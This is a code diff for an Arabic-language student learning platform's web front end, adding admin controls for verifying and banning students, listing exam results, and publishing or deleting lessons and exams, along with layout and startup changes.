+        function toggleVerifyUser(phone) {
+            if (!isAdmin(currentUser)) return;
+            const nextVal = !isUserVerified(phone);
+            studentsRef.child(phone).update({ verified: nextVal });
+        }
+
+        function renderStudentsAdminList() {
+            const container = document.getElementById('students-list-container');
+            if (!container || !isAdmin(currentUser)) return;
+
+            const entries = Object.entries(allStudentsMap).reverse();
+            if (!entries.length) {
+                container.innerHTML = `<p style="color:var(--muted);">لا يوجد طلاب مسجلون بعد.</p>`;
+                return;
+            }
+
+            container.innerHTML = entries.map(([phone, st]) => {
+                const ver = Boolean(st.verified) || ADMIN_PHONES.includes(phone);
+                const av = getUserAvatar(phone);
+                return `
+                    <div class="card student-row-card" style="padding:12px; margin-bottom:10px; text-align:right;">
+                        <div style="display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:10px;">
+                            <div style="display:flex; align-items:center; gap:10px;">
+                                <div class="msg-avatar-sm">
+                                    ${av ? `<img src="${av}" style="width:100%; height:100%; object-fit:cover;">` : `<i class="fas fa-user"></i>`}
+                                </div>
+                                <div>
+                                    <strong>${esc(st.name || '')}</strong>
+                                    ${ver ? `<span class="verified-badge"><i class="fas fa-check"></i></span>` : ''}
+                                    <div style="font-size:12px; color:var(--muted);" class="en-num">${esc(phone)} • ${esc(st.stage || '')}</div>
+                                </div>
+                            </div>
+                            <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                                <button class="btn btn-blue" style="padding:6px 12px; font-size:12px;" onclick="openDirectChat('${escAttr(phone)}')"><i class="fas fa-comment"></i> شات خاص</button>
+                                <button class="btn btn-soft" style="padding:6px 12px; font-size:12px;" onclick="toggleVerifyUser('${escAttr(phone)}')">${ver ? 'إلغاء التوثيق' : 'توثيق الحساب ✔'}</button>
+                                <button class="btn btn-danger" style="padding:6px 10px; font-size:12px;" onclick="banUserPhone('${escAttr(phone)}')">حظر</button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function filterStudentsCards() {
+            const q = document.getElementById('search-students-input').value.toLowerCase();
+            document.querySelectorAll('.student-row-card').forEach(el => {
+                el.style.display = el.innerText.toLowerCase().includes(q) ? 'block' : 'none';
+            });
+        }
+
+        function banUserPhone(phone) {
+            if (!isAdmin(currentUser)) return;
+            blacklistRef.child(phone).set(true);
+        }
+
+        function renderResultsAdminList(data) {
+            const box = document.getElementById('results-list-container');
+            if (!box || !isAdmin(currentUser)) return;
+            const list = Object.values(data).reverse();
+            box.innerHTML = list.length
+                ? list.map(r => `<div style="padding:8px 0; border-bottom:1px solid var(--border); font-size:13px;"><strong>${esc(r.studentName)}</strong> — ${esc(r.examTitle)} — <span style="color:var(--accent);" class="en-num">${esc(r.score)}</span> <small class="en-num" style="color:var(--muted);">(${esc(r.time || '')})</small></div>`).join('')
+                : `<p style="color:var(--muted);">لا توجد نتائج بعد.</p>`;
+        }
+
+        function selectAdminSubject(sub) {
+            selectedAdminSubject = sub;
+            document.getElementById('admin-selected-subject').innerText = sub;
+            document.getElementById('admin-subjects-panel').style.display = 'none';
+            document.getElementById('admin-form-panel').style.display = 'block';
+        }
+
+        function backToAdminSubjects() {
+            document.getElementById('admin-form-panel').style.display = 'none';
+            document.getElementById('admin-subjects-panel').style.display = 'block';
+        }
+
+        function createLessonItem() {
+            const title = document.getElementById('new-lesson-title').value.trim();
+            const url = document.getElementById('new-lesson-url').value.trim();
+            const type = document.getElementById('new-lesson-type').value;
+            if (!title || !url || !selectedAdminSubject) return;
+
+            lessonsRef.push({ title, url, subject: selectedAdminSubject, type, pinned: false }).then(() => {
+                document.getElementById('new-lesson-title').value = '';
+                document.getElementById('new-lesson-url').value = '';
+                backToAdminSubjects();
+                Swal.fire({ title: 'تم النشر ✅', text: 'تمت إضافة المحتوى بنجاح.', icon: 'success', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
+            });
+        }
+
+        function createExamItem() {
+            const title = document.getElementById('new-exam-title').value.trim();
+            const url = document.getElementById('new-exam-url').value.trim();
+            if (!title || !url) return;
+
+            examsRef.push({ title, url }).then(() => {
+                document.getElementById('new-exam-title').value = '';
+                document.getElementById('new-exam-url').value = '';
+                Swal.fire({ title: 'تم النشر ✅', text: 'تم إضافة الامتحان.', icon: 'success', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
+            });
+        }
+
+        function togglePinLesson(id, curr) {
+            lessonsRef.child(id).update({ pinned: !curr });
+        }
+
+        function deleteLesson(id) {
+            lessonsRef.child(id).remove();
+        }
+
+        function deleteExam(id) {
+            examsRef.child(id).remove();
+        }
+
         function logout() {
-            localStorage.removeItem('kimo_auth_v26');
+            localStorage.removeItem('kimo_user_v26');
             location.reload();
         }
 
-        function escapeHtml(str) {
-            return String(str).replace(/[&<>"']/g, m => ({
-                '&': '&amp;',
-                '<': '&lt;',
-                '>': '&gt;',
-                '"': '&quot;',
-                "'": '&#39;'
-            }[m]));
-        }
-
-        function escapeAttr(str) {
-            return String(str).replace(/'/g, "\\'").replace(/"/g, '&quot;');
-        }
-
-        window.addEventListener('scroll', () => {
-            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
-            const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
-            const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
-            const bar = document.getElementById('scroll-progress');
-            if (bar) bar.style.width = scrolled + '%';
-        });
-
         window.addEventListener('resize', () => {
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            if (!user) return;
+            if (!currentUser) return;
             if (window.innerWidth > 768) {
                 document.getElementById('sidebar').style.display = 'flex';
                 document.getElementById('sidebar-toggle').style.display = 'flex';
-                document.getElementById('mob-nav').classList.remove('logged-in');
-                document.getElementById('quick-fab').classList.remove('logged-in');
-                document.getElementById('private-chat-fab').classList.remove('logged-in');
+                document.getElementById('mobile-dock').classList.remove('visible');
+                document.getElementById('floating-dm-btn').classList.remove('visible');
             } else {
                 document.getElementById('sidebar').style.display = 'none';
                 document.getElementById('sidebar-toggle').style.display = 'none';
-                document.getElementById('mob-nav').classList.add('logged-in');
-                document.getElementById('quick-fab').classList.add('logged-in');
-                document.getElementById('private-chat-fab').classList.add('logged-in');
+                document.getElementById('mobile-dock').classList.add('visible');
+                document.getElementById('floating-dm-btn').classList.add('visible');
             }
         });
 
         window.addEventListener('DOMContentLoaded', () => {
-            applySavedTheme();
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            if (user) {
-                blacklistRef.child(user.phone).once('value', snap => {
-                    if (snap.exists()) {
-                        logout();
-                    } else {
-                        runApp();
-                    }
+            initTheme();
+            const saved = JSON.parse(localStorage.getItem('kimo_user_v26'));
+            if (saved && saved.phone) {
+                blacklistRef.child(saved.phone).once('value', snap => {
+                    if (snap.exists()) logout();
+                    else startPlatform();
                 });
             }
         });
